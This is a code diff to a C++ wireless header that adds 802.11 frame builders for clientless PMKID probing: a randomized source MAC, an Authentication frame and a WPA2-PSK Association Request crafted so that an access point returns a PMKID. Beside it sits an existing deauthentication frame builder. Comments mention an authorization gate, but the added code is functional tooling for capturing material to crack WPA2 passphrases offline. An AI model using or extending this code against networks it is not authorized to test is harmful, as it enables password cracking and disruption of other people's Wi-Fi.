@@ -115,5 +115,107 @@ inline std::size_t buildDeauthFrame(uint8_t* out,
     return n;
 }
 
+// --- Clientless PMKID probing (gated) ------------------------------------------------------
+//
+// Solicits an EAPOL M1 (which may carry an RSN PMKID) from a WPA2-PSK AP WITHOUT kicking any
+// client: send an open-system Authentication, then an Association Request bearing an RSN IE.
+// Less disruptive than deauth and works on APs with zero connected stations. NOTE: this does
+// NOT work against WPA3-SAE (no RSN PMKID in SAE) and is blunted by PMF — keep the deauth path
+// as the fallback for those. Like every builder here, this only serializes bytes; the upstream
+// zd::sec authorization gate decides whether a probe is permitted.
+
+// Derive a throwaway, locally-administered, unicast source MAC for a clientless PMKID probe
+// from a 32-bit seed, so we never spoof a real station. Sets the locally-administered bit
+// (0x02) and clears the multicast bit (0x01) of the first octet. Pure + deterministic.
+inline void randomStaMac(uint8_t out[6], uint32_t seed) {
+    uint32_t x = seed ^ 0x9E3779B9u;  // mix so a 0 seed still yields a varied MAC
+    for (std::size_t i = 0; i < 6; ++i) {
+        x ^= x << 13;
+        x ^= x >> 17;
+        x ^= x << 5;  // xorshift32 step
+        out[i] = static_cast<uint8_t>(x & 0xFFu);
+    }
+    out[0] = static_cast<uint8_t>((out[0] | 0x02u) & 0xFEu);  // LAA, unicast
+}
+
+// Open-system Authentication frame: 24-byte MAC header + 6-byte auth body = 30 bytes.
+constexpr std::size_t kAuthFrameLen = 30u;
+
+// Upper bound for an Association Request: 24 hdr + 2 cap + 2 listen + SSID(2+32) + rates(2+4)
+// + RSN(2+20) = 90; rounded up for safety.
+constexpr std::size_t kMaxAssocReqLen = 128u;
+
+// Serialize an open-system Authentication frame from station `sta` to AP `ap`.
+//   addr1 = AP (DA/BSSID), addr2 = STA (SA), addr3 = AP (BSSID)
+inline std::size_t buildAuthFrame(uint8_t* out, const uint8_t ap[6], const uint8_t sta[6]) {
+    std::size_t n = 0;
+    out[n++] = 0xB0;  // FC: mgmt type (00), subtype Authentication (1011)
+    out[n++] = 0x00;
+    out[n++] = 0x00;  // Duration
+    out[n++] = 0x00;
+    for (std::size_t i = 0; i < 6; ++i) out[n++] = ap[i];   // addr1 DA (AP)
+    for (std::size_t i = 0; i < 6; ++i) out[n++] = sta[i];  // addr2 SA (STA)
+    for (std::size_t i = 0; i < 6; ++i) out[n++] = ap[i];   // addr3 BSSID
+    out[n++] = 0x00;  // Sequence control (hardware overwrites)
+    out[n++] = 0x00;
+    // Authentication body: algorithm = Open System (0), transaction seq = 1, status = 0.
+    out[n++] = 0x00;  // algorithm (LE)
+    out[n++] = 0x00;
+    out[n++] = 0x01;  // transaction sequence (LE)
+    out[n++] = 0x00;
+    out[n++] = 0x00;  // status code (LE)
+    out[n++] = 0x00;
+    return n;  // == kAuthFrameLen (30)
+}
+
+// Serialize an Association Request from `sta` to AP `ap` for `ssid` (ssidLen <= 32), carrying
+// an RSN IE (WPA2-PSK / CCMP) so the AP replies with an EAPOL M1 that may include a PMKID.
+// `out` MUST have room for kMaxAssocReqLen bytes. Returns the number of bytes written.
+inline std::size_t buildAssocRequest(uint8_t* out, const uint8_t ap[6], const uint8_t sta[6],
+                                     const char* ssid, std::size_t ssidLen) {
+    if (ssidLen > 32u) {
+        ssidLen = 32u;
+    }
+    std::size_t n = 0;
+    out[n++] = 0x00;  // FC: mgmt type (00), subtype Association Request (0000)
+    out[n++] = 0x00;
+    out[n++] = 0x00;  // Duration
+    out[n++] = 0x00;
+    for (std::size_t i = 0; i < 6; ++i) out[n++] = ap[i];   // addr1 DA (AP)
+    for (std::size_t i = 0; i < 6; ++i) out[n++] = sta[i];  // addr2 SA (STA)
+    for (std::size_t i = 0; i < 6; ++i) out[n++] = ap[i];   // addr3 BSSID
+    out[n++] = 0x00;  // Sequence control
+    out[n++] = 0x00;
+    // Fixed fields: Capability Info (ESS + Privacy) then Listen Interval, both little-endian.
+    out[n++] = 0x11;  // 0x0011 = ESS(bit0) | Privacy(bit4)
+    out[n++] = 0x00;
+    out[n++] = 0x0A;  // Listen interval = 10
+    out[n++] = 0x00;
+    // SSID element (tag 0).
+    out[n++] = 0x00;
+    out[n++] = static_cast<uint8_t>(ssidLen);
+    for (std::size_t i = 0; i < ssidLen; ++i) {
+        out[n++] = static_cast<uint8_t>(ssid[i]);
+    }
+    // Supported Rates element (tag 1): 1, 2, 5.5, 11 Mbps (basic-rate bit set).
+    out[n++] = 0x01;
+    out[n++] = 0x04;
+    out[n++] = 0x82;
+    out[n++] = 0x84;
+    out[n++] = 0x8B;
+    out[n++] = 0x96;
+    // RSN element (tag 48): WPA2, group+pairwise CCMP (00-0F-AC-04), AKM PSK (00-0F-AC-02).
+    out[n++] = 0x30;
+    out[n++] = 0x14;  // length = 20
+    out[n++] = 0x01;  out[n++] = 0x00;                                   // version 1
+    out[n++] = 0x00;  out[n++] = 0x0F; out[n++] = 0xAC; out[n++] = 0x04; // group: CCMP
+    out[n++] = 0x01;  out[n++] = 0x00;                                   // pairwise count
+    out[n++] = 0x00;  out[n++] = 0x0F; out[n++] = 0xAC; out[n++] = 0x04; // pairwise: CCMP
+    out[n++] = 0x01;  out[n++] = 0x00;                                   // AKM count
+    out[n++] = 0x00;  out[n++] = 0x0F; out[n++] = 0xAC; out[n++] = 0x02; // AKM: PSK
+    out[n++] = 0x00;  out[n++] = 0x00;                                   // RSN capabilities
+    return n;
+}
+
 }  // namespace dot11
 }  // namespace zd
